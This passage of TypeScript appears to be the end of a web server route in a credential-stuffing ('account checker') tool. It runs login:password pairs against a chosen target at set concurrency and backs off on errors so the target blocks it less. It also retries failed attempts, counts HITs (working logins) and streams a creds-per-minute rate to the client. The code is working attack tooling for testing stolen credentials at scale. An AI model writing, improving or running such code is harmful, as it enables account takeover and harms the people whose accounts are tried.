  const concurrency = CONCURRENCY[target];

  type CheckResultEx = CheckResult & { wasRetried: boolean };

  const mapper = async ({ login, password }: { login: string; password: string }): Promise<CheckResultEx> => {
    if (clientGone) return { credential: `${login}:?`, login, status: "ERROR", detail: "aborted", wasRetried: false };

    // ── Adaptive rate-limit back-off ─────────────────────────────────────────
    // If last N checks were all ERRORs (network/timeout), slow down to avoid
    // hammering the target and getting harder-blocked.
    if (consecutiveErrors >= 3) {
      const delay = Math.min(consecutiveErrors * 400, 4_000);
      await sleep(delay);
    }

    // ── First attempt ────────────────────────────────────────────────────────
    let result = await checker(login, password);
    let wasRetried = false;

    // ── Auto-retry once on ERROR (network/timeout/5xx) ───────────────────────
    if (result.status === "ERROR") {
      await sleep(800);
      const retry = await checker(login, password);
      if (retry.status !== "ERROR") {
        result     = retry;
        wasRetried = true;
      }
    }

    // ── Track consecutive error streak ───────────────────────────────────────
    if (result.status === "ERROR") consecutiveErrors = Math.min(consecutiveErrors + 1, 20);
    else                           consecutiveErrors = Math.max(consecutiveErrors - 1, 0);

    return { ...result, wasRetried };
  };

  await pMap(
    pairs,
    mapper,
    concurrency,
    (result: CheckResultEx, index: number) => {
      if (result.status === "HIT")        hits++;
      else if (result.status === "FAIL")  fails++;
      else                                errors++;
      if (result.wasRetried) retries++;
      send({ type: "result", ...result, index, total, hits, fails, errors, retries });
    },
  );

  clearInterval(heartbeat);
  const elapsedMs   = Date.now() - startedAt;
  const credsPerMin = elapsedMs > 0 ? Math.round((total / elapsedMs) * 60_000) : 0;
  send({ type: "done", total, hits, fails, errors, retries, elapsedMs, credsPerMin });
  res.end();
});

export default router;
